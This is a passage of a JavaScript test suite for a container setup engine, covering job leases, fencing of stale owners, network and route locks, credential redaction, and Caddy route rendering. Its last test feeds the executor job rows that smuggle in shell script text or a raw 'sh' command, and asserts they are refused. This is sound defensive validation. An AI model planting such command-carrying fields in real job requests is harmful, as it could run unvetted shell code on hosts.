      assert.deepEqual(p.reconcile, [], `tick ${p.tick}: the runner's reconcile touched nothing: ${JSON.stringify(p)}`);
      assert.deepEqual(p.job, { status: 'running', owner: BACKEND, live: true }, `tick ${p.tick}: the claim is this backend's and live`);
      assert.deepEqual(p.guest, { owner: BACKEND, live: true }, `tick ${p.tick}`); assert.deepEqual(p.routes, { owner: BACKEND, live: true }, `tick ${p.tick}`);
    }
    assert.equal(out.ran[0].status, 'succeeded', getJob(d, id).reason); assert.equal(out.ran[0].outcome, 'routes_configured');
    assert.equal(caddy.log.reload, 1, 'the reload ran once'); assert.equal(caddy.log.adapt, 1);
    assert.equal(getJob(d, id).status, 'succeeded'); assert.equal(getJob(d, 'setup-1').outcome, 'setup_complete'); assert.equal(parseJson(getJob(d, 'create-1').progress_json).setup.completion, 'complete');
    assert.equal(readLock(d, 'pp-n'), null); assert.equal(readLock(d, HOST_ROUTES_LOCK), null);
  }
  // 2) The claim ends under the render: a heartbeat that never came (the
  // process paused), the runner's reconcile records the job interrupted and
  // releases its guest lock, another owner takes that lock — all while adapt
  // waits. The keep-alive sees the claim gone; the next write is refused.
  {
    const d = db(); const dir = tmp(); dirs.push(dir); const c = clock(); let id; let recon = null; let rowAfterReconcile = null;
    const caddy = caddyDir(dir, { adapt: async () => {
      d.prepare(`UPDATE setup_jobs SET lease_expires_at = ? WHERE id = ?`).run(iso(c.nowMs() - 1), id);
      recon = reconcile({ db: d, owner: RUNNER, nowMs: c.nowMs() });
      rowAfterReconcile = { ...getJob(d, id) };
      assert.ok(acquireLock(d, { app: 'pp-n', owner: OTHER, operation: 'instance_stop', jobId: 'o-1', leaseMs: 60_000, nowMs: c.nowMs() }).ok, 'the released guest lock is another owner\'s now');
      await sleepReal(120);
    } });
    opsStore(d, h, g, { renderDeps: caddy.render }); id = seedRoutesChain(d);
    const out = await drainBackendStepsNow(undefined, { nowMs: c.nowMs, keepAliveMs: 20 });
    assert.deepEqual(recon.interrupted, [id], 'the runner recorded the job interrupted'); assert.equal(rowAfterReconcile.status, 'failed'); assert.equal(rowAfterReconcile.outcome, 'interrupted');
    assert.equal(out.ran[0].status, 'fenced', JSON.stringify(out.ran[0]));
    assert.equal(caddy.log.reload, 0, 'no reload after the claim ended'); assert.deepEqual([caddy.log.writes, caddy.log.removes], [[], []], 'no rollback write either');
    const row = getJob(d, id);
    assert.deepEqual({ status: row.status, outcome: row.outcome, lease: row.lease_expires_at, reason: row.reason }, { status: 'failed', outcome: 'interrupted', lease: rowAfterReconcile.lease_expires_at, reason: rowAfterReconcile.reason }, 'the record the reconciler wrote stands: nothing revived the claim, nothing rewrote the outcome');
    assert.ok(!listEvents(d, id).some((e) => /lease_lost|routes were not completed/.test(e.message || '')), 'the step recorded no outcome of its own on a job that is no longer its');
    assert.equal(readLock(d, 'pp-n').owner, OTHER, 'the other owner\'s guest lock is untouched'); assert.equal(readLock(d, HOST_ROUTES_LOCK), null, 'the step\'s own routes lock is released');
    assert.equal(getJob(d, 'setup-1').outcome, 'setup_pending', 'the setup record is the next owner\'s to settle (the boot sweep or a retry), not a fenced step\'s');
  }
  // 3) The claim re-assigned at a new epoch (another backend claimed the requeued job) while the render waits.
  {
    const d = db(); const dir = tmp(); dirs.push(dir); const c = clock(); let id; const NEXT = ownerIdentity({ kind: 'backend', host: 'pp', pid: 101, instance: 'bbbb' });
    const caddy = caddyDir(dir, { adapt: async () => { d.prepare(`UPDATE setup_jobs SET owner = ?, epoch = epoch + 1, lease_expires_at = ? WHERE id = ?`).run(NEXT, iso(c.nowMs() + 30_000), id); await sleepReal(120); } });
    opsStore(d, h, g, { renderDeps: caddy.render }); id = seedRoutesChain(d);
    const out = await drainBackendStepsNow(undefined, { nowMs: c.nowMs, keepAliveMs: 20 });
    assert.equal(out.ran[0].status, 'fenced'); assert.equal(caddy.log.reload, 0); assert.deepEqual(caddy.log.writes, []);
    const row = getJob(d, id); assert.equal(row.owner, NEXT); assert.equal(row.status, 'running', 'the next owner\'s claim is untouched: not finished, not failed by the fenced step');
    assert.equal(getJob(d, 'setup-1').outcome, 'setup_pending'); assert.equal(readLock(d, HOST_ROUTES_LOCK), null);
  }
});

test('the shared network lease is RENEWED through a slow live sequence (each command longer than the lease period): no other job can take it over meanwhile and every command is issued; a worker whose lease was taken over issues no further mutation', async (t) => {
  const c = clock();
  const d = db(); const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const g = scriptedGuest({});
  // Every host command takes 20 s (lease 30 s): the sequence outlives the lease many times over.
  const probes = [];
  st.onCall = async (argv) => { c.tick(20_000); if (argv[0] !== 'incus' || argv[1] !== 'list') { const l = readLock(d, HOST_NETWORK_LOCK); probes.push({ cmd: argv.slice(0, 3).join(' '), owner: l?.owner || null, live: !!l && Date.parse(l.lease_expires_at) > c.nowMs(), foreign: acquireLock(d, { app: HOST_NETWORK_LOCK, owner: OTHER, operation: 'network_nat', jobId: 'o', nowMs: c.nowMs() }).reason }); } };
  const s1 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat'] }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  assert.equal(getJob(d, s1.job.id).status, 'succeeded', getJob(d, s1.job.id).reason);
  assert.ok(probes.length >= 6, `a full NAT sequence ran: ${probes.length} commands`);
  for (const p of probes) { assert.equal(p.owner, RUNNER, `${p.cmd}: the lease is this job's`); assert.equal(p.live, true, `${p.cmd}: renewed, not lapsed`); assert.equal(p.foreign, 'held', `${p.cmd}: another job cannot take it`); }
  assert.equal(readLock(d, HOST_NETWORK_LOCK), null, 'released at the end');
  assert.ok(mutations(h).some((a) => a[0] === 'iptables' && a[1] === '-I'), 'the DOCKER-USER insert was issued once, by this job');
  // Ownership taken away mid-sequence (a takeover after a lapse we force): the worker stops before its next write.
  const d2 = db(); const st2 = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h2 = scriptedHost(st2); let n = 0;
  st2.onCall = async (argv) => { if (argv[0] === 'incus' && argv[1] === 'list') return; n += 1; if (n === 3) { d2.exec(`UPDATE setup_locks SET lease_expires_at = '2000-01-01T00:00:00.000Z' WHERE app = '${HOST_NETWORK_LOCK}'`); const t = takeoverLock(d2, { app: HOST_NETWORK_LOCK, by: OTHER, operation: 'network_nat', jobId: 'other-1', reason: 'test', nowMs: c.nowMs() }); assert.ok(t.ok, 'the other job took the lapsed lease'); } };
  const s2 = submitRunnerJob(d2, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat', 'dns'] }, nowMs: c.nowMs() });
  await runAll(d2, exec(h2, g), c);
  const ph = phasesOf(d2, s2.job.id);
  assert.equal(ph.network_nat.state, 'failed'); assert.equal(ph.network_nat.leaseLost, true); assert.equal(ph.network_nat.issued, 3, 'three commands, then nothing');
  assert.equal(mutations(h2).filter((a) => a[0] === 'iptables').length, 0, 'no iptables write was issued after the loss');
  assert.equal(readLock(d2, HOST_NETWORK_LOCK).owner, OTHER, 'the new owner\'s lease is untouched by the fenced worker');
  assert.equal(ph.dns.state, 'done', 'the phases that need no shared lease still run'); assert.equal(getJob(d2, s2.job.id).outcome, 'setup_partial');
  assert.ok(listEvents(d2, s2.job.id).some((e) => /lease is no longer this job's/.test(e.message)));
});

test('a credential the init script echoes never enters a job row, an event, a verification or the create-status answer — through the real wrapper under a real sh with the guest\'s umask at 022 — and the guest\'s artifacts are owner-only', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const guestDir = tmp(); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const gs = { realShell: guestDir }; const g = scriptedGuest(gs);
  createJob(d, { id: 'create-1', kind: 'instance_create', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', image: 'images:debian/12' } }, status: 'succeeded', nowMs: T0 - 1000 });
  const script = writeInitScriptInput(inputsDir, ECHO_SCRIPT);
  const sub = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['dns', 'init_script'], expect: { uuid: UUID_B }, initScript: script, origin: { jobId: 'create-1', kind: 'instance_create' } }, nowMs: T0 });
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out.ran[0].status, 'failed'); assert.equal(out.ran[0].outcome, 'setup_partial');
  const ph = phasesOf(d, sub.job.id);
  assert.equal(ph.init_script.state, 'failed'); assert.equal(ph.init_script.rc, 5); assert.ok(ph.init_script.logBytes > 20); assert.equal(ph.init_script.log, join(guestDir, `pp-init-${sub.job.id}.log`), 'the record names the log the guest reported (its /var/log, redirected here)');
  const logFile = join(guestDir, `pp-init-${sub.job.id}.log`);
  assert.ok(readFileSync(logFile, 'utf8').includes(CRED), 'the credential is in the guest\'s log'); assert.equal(statSync(logFile).mode & 0o777, 0o600, 'owner-only under umask 022');
  assert.equal(statSync(join(guestDir, `pp-init-${sub.job.id}.rc`)).mode & 0o777, 0o600);
  noScriptIn(d, [sub.job.id, 'create-1']);
  for (const row of d.prepare(`SELECT * FROM setup_jobs`).all()) assert.equal(JSON.stringify(row).includes(CRED), false, 'no row anywhere');
  for (const row of d.prepare(`SELECT * FROM setup_job_events`).all()) assert.equal(JSON.stringify(row).includes(CRED), false, 'no event anywhere');
  const view = createStatusView({ create: jobView(getJob(d, 'create-1')), setup: jobView(getJob(d, sub.job.id)), nowMs: T0 });
  assert.equal(JSON.stringify(view).includes(CRED), false); assert.match(view.initScriptWarning, /exited with code 5; its output \(\d+ bytes\) is in \S+pp-init-\S+\.log inside the container/);
  // A resumed read-back of that guest (the real read script): the exit code, never the log.
  const gs2 = { realShell: guestDir }; const g2 = scriptedGuest(gs2);
  const d2 = db();
  deadSetup(d2, { id: sub.job.id, params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script }, cp: { phase: 'init_script', setup: true, resumable: true, disruptive: false, init_issued: true, target: { uuid: UUID_B }, container: 'pp-n', phases: {} } });
  reconcile({ db: d2, owner: RUNNER, nowMs: c.nowMs() });
  await runAll(d2, exec(h, g2), c, { inputsDir });
  assert.equal(phasesOf(d2, sub.job.id).init_script.rc, 5); assert.equal(phasesOf(d2, sub.job.id).init_script.resumed, true);
  for (const row of d2.prepare(`SELECT * FROM setup_jobs`).all()) assert.equal(JSON.stringify(row).includes(CRED), false);
  for (const row of d2.prepare(`SELECT * FROM setup_job_events`).all()) assert.equal(JSON.stringify(row).includes(CRED), false);
  rmSync(guestDir, { recursive: true, force: true });
});

// ── 8. the routes step itself ─────────────────────────────────────────────

function ensureRoutesSchema(d) {
  d.exec(`CREATE TABLE services (id TEXT PRIMARY KEY, name TEXT NOT NULL, kind TEXT NOT NULL DEFAULT 'container_service', runtime TEXT, target_ip TEXT, lxc_container_name TEXT, type TEXT NOT NULL, status TEXT DEFAULT 'active', is_admin INTEGER DEFAULT 0, updated_at TEXT DEFAULT CURRENT_TIMESTAMP);
    CREATE TABLE service_http_routes (id TEXT PRIMARY KEY, service_id TEXT NOT NULL, domain TEXT NOT NULL, path_prefix TEXT NOT NULL DEFAULT '/', target_port INTEGER, websocket_enabled INTEGER DEFAULT 0, ssl_enabled INTEGER DEFAULT 1, force_https INTEGER DEFAULT 1, max_upload_size TEXT DEFAULT '1G', strip_prefix INTEGER NOT NULL DEFAULT 0, health_path TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP, UNIQUE(domain, path_prefix));`);
}
// The render bundle lib/route-render.js renderDomains takes: one batch per
// call recorded in `rendered` (closed by the reload; a failed adapt records
// nothing, as the real one restores the site files).
function fakeRender(rendered = [], { fail = null } = {}) {
  let current = [];
  return {
    regenerate: async (db, domain) => { current.push(domain); },
    adapt: async () => { if (fail === 'adapt') { current = []; throw new Error('caddy adapt: syntax'); } },
    reload: async () => { if (current.length) rendered.push(current); current = []; },
    caddyFilePath: (dom) => `/nonexistent/pp-test/${dom}.caddy`, writeConfig: async () => {}, removeConfig: async () => {},
  };
}

test('configureGuestRoutes over the real tables: rows first, the render second; a domain routed to ANOTHER service is a conflict that is never clobbered; a render failure keeps the rows and says so; the upstream move re-renders what the service already served', async () => {
  const d = db(); ensureRoutesSchema(d);
  d.exec(`INSERT INTO services (id, name, type, lxc_container_name) VALUES ('other', 'other', 'docker', 'other'); INSERT INTO service_http_routes (id, service_id, domain, target_port) VALUES ('r0', 'other', 'api.example.test', 80)`);
  const rendered = [];
  let r = await configureGuestRoutes(d, { name: 'n', ip: '10.10.10.7', services: SERVICES, render: fakeRender(rendered) });
  assert.deepEqual(r.created, ['app.example.test']); assert.deepEqual(r.conflicts, [{ domain: 'api.example.test', detail: 'already routed elsewhere; not added' }]); assert.equal(r.renderWarning, null);
  assert.equal(d.prepare(`SELECT service_id FROM service_http_routes WHERE domain = 'api.example.test'`).get().service_id, 'other', 'never clobbered');
  const row = d.prepare(`SELECT * FROM service_http_routes WHERE domain = 'app.example.test'`).get();
  assert.equal(row.target_port, 3000); assert.equal(row.ssl_enabled, 1); assert.equal(row.force_https, 1); assert.equal(row.health_path, null);
  // A render failure on a new guest with a fresh domain: rows kept, warning.
  const d2 = db(); ensureRoutesSchema(d2);
  r = await configureGuestRoutes(d2, { name: 'n', ip: '10.10.10.7', services: [SERVICES[1]], render: fakeRender([], { fail: 'adapt' }) });
  assert.deepEqual(r.created, ['api.example.test']); assert.match(r.renderWarning, /Caddy was not updated: .*syntax/);
  assert.equal(d2.prepare(`SELECT health_path FROM service_http_routes`).get().health_path, '/healthz');
  // The upstream move: the guest recreated at a new address re-renders its existing domain with the new rows.
  const rendered3 = [];
  r = await configureGuestRoutes(d2, { name: 'n', ip: '10.10.10.9', services: SERVICES, render: fakeRender(rendered3) });
  assert.deepEqual(r.existing, ['api.example.test']); assert.deepEqual(r.created, ['app.example.test']);
  assert.equal(d2.prepare(`SELECT target_ip FROM services WHERE lxc_container_name = 'n'`).get().target_ip, '10.10.10.9');
  const svc = findOrCreateLxcService(d2, 'n', '1.2.3.4');
  assert.equal(svc.target_ip, '10.10.10.9', 'find never writes the address');
  const moved = await syncServiceUpstream(d2, svc, '10.10.10.9', fakeRender([]));
  assert.equal(moved.changed, false, 'unchanged address: nothing rendered');
});

// ── 9. unavailable runners, unresolved holds, contention ──────────────────

test('runner-required with no runner: a direct setup is refused (cancelled / runner_unavailable, nothing run) and a create is refused before any launch; with a live runner the create and its setup queue for it and the runner runs both', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const g = scriptedGuest({});
  opsStore(d, h, g, { policy: 'runner-required', inputsDir });
  t.after(() => configureContainerLockStore(null));
  const refused = await runGuestSetup({ containerName: 'pp-n', phases: ['network_nat', 'dns'], via: 'ui' });
  assert.equal(refused.ok, false); assert.equal(refused.step, 'runner_unavailable'); assert.equal(getJob(d, refused.jobId).status, 'cancelled'); assert.equal(lifecycleHttpStatus(refused), 503);
  assert.deepEqual(h.calls, []);
  const create = await runLifecycle({ kind: 'instance_create', containerName: 'pp-q', image: 'images:debian/12', setup: { phases: ['network_nat', 'await_address', 'dns'] }, via: 'ui' });
  assert.equal(create.ok, false); assert.equal(create.step, 'runner_unavailable'); assert.equal(st.launches, undefined);
  runnerHeartbeat(d, { owner: RUNNER, host: 'pp', pid: 300, nowMs: Date.now() });
  const handed = await runLifecycle({ kind: 'instance_create', containerName: 'pp-q', image: 'images:debian/12', setup: { phases: ['network_nat', 'await_address', 'dns'] }, via: 'ui', detach: true });
  assert.equal(handed.ok, true); assert.equal(handed.executor, 'runner'); assert.equal(getJob(d, handed.jobId).status, 'queued'); assert.deepEqual(h.calls, [], 'the backend ran nothing');
  assert.equal(createStatus(d, 'pp-q', { nowMs: Date.now() }).phase, 'downloading');
  const out = await runAll(d, exec(h, g), clock(Date.now()), { inputsDir });
  assert.deepEqual(out.ran.map((j) => [j.kind, j.status]), [['instance_create', 'succeeded'], ['guest_setup', 'succeeded']]);
  assert.equal(getJob(d, out.ran[1].id).owner, RUNNER); assert.equal(createStatus(d, 'pp-q', { nowMs: Date.now() }).phase, 'ready');
  void c;
});

test('unresolved holds: a guest whose restart ended interrupted_uncertain refuses a direct setup at submission (lock stale) and at the executor; a setup FOLLOW-UP meeting the hold is requeued with the lease untouched; after the acknowledgement it runs', async (t) => {
  const d = db(); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const g = scriptedGuest({});
  createJob(d, { id: 'restart-1', kind: 'instance_restart', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n' } }, nowMs: T0 - 50_000 });
  const cl = claimNextJob(d, { owner: DEAD, kinds: ['instance_restart'], nowMs: T0 - 49_000 });
  recordJobOutcome(d, { id: 'restart-1', status: 'recovery_required', outcome: 'interrupted_uncertain', reason: 'owner gone after issuing', by: RUNNER, nowMs: T0 - 40_000 });
  holdStaleLock(d, { app: 'pp-n', owner: DEAD, operation: 'instance_restart', jobId: 'restart-1', epoch: cl.epoch, nowMs: T0 - 40_000 });
  const direct = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['dns'] }, nowMs: T0 });
  assert.equal(direct.code, 'CONTAINER_LOCK_STALE');
  const row = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', phases: ['dns'] } }, nowMs: T0 });
  await runAll(d, exec(h, g), c, { kinds: ['guest_setup'] });
  assert.equal(getJob(d, row.id).status, 'refused'); assert.equal(getJob(d, row.id).outcome, 'lock_stale'); assert.equal(g.calls.length, 0);
  const follow = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', phases: ['dns'], origin: { jobId: 'restart-1', kind: 'instance_restart' } } }, nowMs: T0 + 1 });
  await runAll(d, exec(h, g), c, { kinds: ['guest_setup'] });
  assert.equal(getJob(d, follow.id).status, 'queued', 'requeued, not finished'); assert.ok(listEvents(d, follow.id).some((e) => e.kind === 'hold'));
  assert.ok(readLock(d, 'pp-n')?.stale_since, 'the hold stands'); assert.equal(readLock(d, 'pp-n').recovery_job_id, 'restart-1');
  const { acknowledgeUncertainJob } = await import('../lib/setup-engine/backend.js');
  assert.equal(acknowledgeUncertainJob(d, { id: 'restart-1', by: 'thomas', nowMs: T0 + 2 }).ok, true);
  c.tick(6 * 60_000);
  await runAll(d, exec(h, g), c, { kinds: ['guest_setup'] });
  assert.equal(getJob(d, follow.id).status, 'succeeded');
});

test('contention on the shared network lease: a live holder is waited for and the phase is skipped (contended) when it never lets go — the retry redoes it; a dead holder is taken over; the lease is released afterwards', async (t) => {
  const d = db(); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } }), inst({ name: 'pp-m', config: { 'volatile.uuid': UUID_A } })] }; const h = scriptedHost(st); const g = scriptedGuest({});
  // Another live runner holds the network lease for its own setup and keeps renewing it.
  const held = acquireLock(d, { app: HOST_NETWORK_LOCK, owner: OTHER, operation: 'network_nat', jobId: 'other-1', leaseMs: 10 * 60_000, nowMs: T0 });
  assert.ok(held.ok);
  const s1 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat', 'dns'] }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  const ph = phasesOf(d, s1.job.id);
  assert.equal(ph.network_nat.state, 'skipped'); assert.equal(ph.network_nat.contended, true); assert.match(ph.network_nat.detail, /held by .*20 s waited/);
  assert.equal(ph.dns.state, 'done'); assert.equal(getJob(d, s1.job.id).status, 'failed'); assert.equal(getJob(d, s1.job.id).outcome, 'setup_partial');
  assert.ok(!h.calls.some((a) => a[0] === 'sysctl'), 'no NAT command was issued under another holder\'s lease');
  assert.equal(readLock(d, HOST_NETWORK_LOCK).owner, OTHER, 'the holder\'s lease is untouched');
  // The holder dies: its lease lapses; the next setup takes it over.
  releaseLock(d, { app: HOST_NETWORK_LOCK, owner: OTHER, epoch: held.lock.epoch });
  acquireLock(d, { app: HOST_NETWORK_LOCK, owner: DEAD, operation: 'network_nat', jobId: 'dead-9', leaseMs: 1000, nowMs: T0 - 100_000 });
  const s2 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-m', params: { container: 'pp-m', phases: ['network_nat'] }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  assert.equal(phasesOf(d, s2.job.id).network_nat.state, 'done'); assert.ok(listEvents(d, s2.job.id).some((e) => e.kind === 'lock_takeover' || /took over the host network lease/.test(e.message)));
  assert.equal(readLock(d, HOST_NETWORK_LOCK), null, 'released after the phase'); assert.equal(readLock(d, 'pp-m'), null);
});

test('contention on the routes: a configure_routes job meeting the guest\'s live lease, or the route store\'s, is requeued with a not-before and runs later; two guests\' routes never interleave', async (t) => {
  const d = db(); const asked = [];
  const deps = { configureRoutes: async (args) => { asked.push(args.name); return { created: args.services.map((s) => s.domain), rendered: args.services.map((s) => s.domain) }; } };
  const mk = (id, app, name) => createJob(d, { id, kind: 'configure_routes', app, plan: { steps: [], params: { container: app, serviceName: name, ip: '10.10.10.7', services: [SERVICES[0]], origin: { jobId: 'nope' } } }, nowMs: T0 });
  mk('r-1', 'pp-n', 'n');
  const guestLease = acquireLock(d, { app: 'pp-n', owner: OTHER, operation: 'instance_restart', jobId: 'x', leaseMs: 60_000, nowMs: T0 });
  let out = await runBackendSteps({ db: d, owner: BACKEND, deps, nowMs: () => T0 + 1, sleep: async () => {} });
  assert.deepEqual(out.ran.map((j) => j.status), ['requeued']); assert.equal(getJob(d, 'r-1').status, 'queued'); assert.deepEqual(asked, []);
  releaseLock(d, { app: 'pp-n', owner: OTHER, epoch: guestLease.lock.epoch });
  out = await runBackendSteps({ db: d, owner: BACKEND, deps, nowMs: () => T0 + 2, sleep: async () => {} });
  assert.deepEqual(out.ran, [], 'the not-before holds it back');
  out = await runBackendSteps({ db: d, owner: BACKEND, deps, nowMs: () => T0 + 31_000, sleep: async () => {} });
  assert.deepEqual(out.ran.map((j) => j.status), ['succeeded']); assert.deepEqual(asked, ['n']);
  // The route store held by another backend process: requeued; taken over when that holder is dead.
  mk('r-2', 'pp-m', 'm');
  const storeLease = acquireLock(d, { app: HOST_ROUTES_LOCK, owner: OTHER, operation: 'configure_routes', jobId: 'y', leaseMs: 60_000, nowMs: T0 + 31_000 });
  let now = T0 + 31_001; const tick = { nowMs: () => now, sleep: async (ms) => { now += ms; } };
  out = await runBackendSteps({ db: d, owner: BACKEND, deps, ...tick });
  assert.deepEqual(out.ran.map((j) => j.status), ['requeued']); assert.ok(listEvents(d, 'r-2').some((e) => e.kind === 'requeued' && /route store is being written/.test(e.message))); assert.equal(readLock(d, 'pp-m'), null, 'the guest lease was released with the requeue');
  releaseLock(d, { app: HOST_ROUTES_LOCK, owner: OTHER, epoch: storeLease.lock.epoch });
  acquireLock(d, { app: HOST_ROUTES_LOCK, owner: DEAD_BACKEND, operation: 'configure_routes', jobId: 'z', leaseMs: 1, nowMs: T0 });
  now += 31_000;
  out = await runBackendSteps({ db: d, owner: BACKEND, deps, ...tick });
  assert.deepEqual(out.ran.map((j) => j.status), ['succeeded']); assert.deepEqual(asked, ['n', 'm']); assert.equal(readLock(d, HOST_ROUTES_LOCK), null);
});

test('a lifecycle verb is refused while a guest setup is open, and a setup is refused while a lifecycle verb runs — never queued behind', async (t) => {
  const d = db();
  const open = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', phases: ['dns'] } }, nowMs: T0 });
  const stop = submitRunnerJob(d, { kind: 'instance_stop', app: 'pp-n', params: { container: 'pp-n' }, nowMs: T0 });
  assert.equal(stop.code, 'CONTAINER_BUSY'); assert.match(stop.error, /guest_setup job .* is queued/);
  claimNextJob(d, { owner: RUNNER, kinds: ['guest_setup'], nowMs: T0 });
  void open;
  const d2 = db();
  acquireLock(d2, { app: 'pp-n', owner: RUNNER, operation: 'instance_restart', jobId: 'j', nowMs: T0 });
  const setup = submitRunnerJob(d2, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['dns'] }, nowMs: T0 });
  assert.equal(setup.code, 'CONTAINER_BUSY'); assert.match(setup.error, /the guest setup was refused before any change/);
  const d3 = db();
  const routes = createJob(d3, { kind: 'configure_routes', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', serviceName: 'n', ip: '10.0.0.1', services: [SERVICES[0]] } }, nowMs: T0 });
  const stop2 = submitRunnerJob(d3, { kind: 'instance_stop', app: 'pp-n', params: { container: 'pp-n' }, nowMs: T0 + 1 });
  assert.match(stop2.error, /configure_routes job/); void routes;
});

test('the direct setup surface (a re-run of the setup of a guest that is there): the plan and its digest, an invalid request never reaches the store, the executor runs it and the record shows every phase', async (t) => {
  const d = db(); const c = clock(); const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const g = scriptedGuest({});
  opsStore(d, h, g);
  t.after(() => configureContainerLockStore(null));
  const p1 = resolveSetupPlan(d, { containerName: 'pp-n', phases: ['dns', 'network_nat'], expect: { uuid: UUID_B } });
  assert.ok(p1.ok); assert.deepEqual(p1.params.phases, ['network_nat', 'dns']); assert.notEqual(p1.digest, resolveSetupPlan(d, { containerName: 'pp-n', phases: ['dns'], expect: { uuid: UUID_B } }).digest);
  assert.match(resolveSetupPlan(d, { containerName: 'pp-n', phases: ['routes'] }).error, /services/);
  const bad = await runGuestSetup({ containerName: 'pp-n', phases: ['init_script'], initScript: { ref: 'r', sha256: 'zz', bytes: 1 } });
  assert.equal(bad.code, 'INVALID'); assert.equal(listJobs(d).length, 0);
  const ok = await runGuestSetup({ containerName: 'pp-n', phases: ['network_nat', 'dns'], expect: { uuid: UUID_B }, via: 'ui', requestedBy: 'thomas' });
  assert.equal(ok.ok, true, JSON.stringify(ok)); assert.equal(ok.step, 'setup_complete'); assert.deepEqual(Object.keys(ok.phases), ['network_nat', 'dns']);
  assert.equal(getJob(d, ok.jobId).via, 'ui'); assert.equal(getJob(d, ok.jobId).requested_by, 'thomas');
  void c;
});

test('the executor accepts only what it validates: a guest_setup row carrying the script text, a command, or an unordered plan is refused at claim with nothing run', async (t) => {
  const d = db(); const c = clock(); const h = scriptedHost({ instances: [inst({ name: 'pp-n' })] }); const g = scriptedGuest({});
  for (const params of [{ container: 'pp-n', phases: ['dns'], initScriptText: '#!/bin/sh' }, { container: 'pp-n', phases: ['dns'], command: 'sh' }, { container: 'pp-n', phases: ['routes', 'dns'] }, { container: 'pp-n', phases: ['init_script'], initScript: { ref: 'r', sha256: SHA, bytes: 1, text: 'x' } }]) {
    const row = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params }, nowMs: T0 });
    await runAll(d, exec(h, g), c, { kinds: ['guest_setup'] });
    assert.equal(getJob(d, row.id).status, 'refused', JSON.stringify(params)); assert.equal(getJob(d, row.id).outcome, 'invalid');
  }
  assert.deepEqual(h.calls, []); assert.equal(g.calls.length, 0);
});
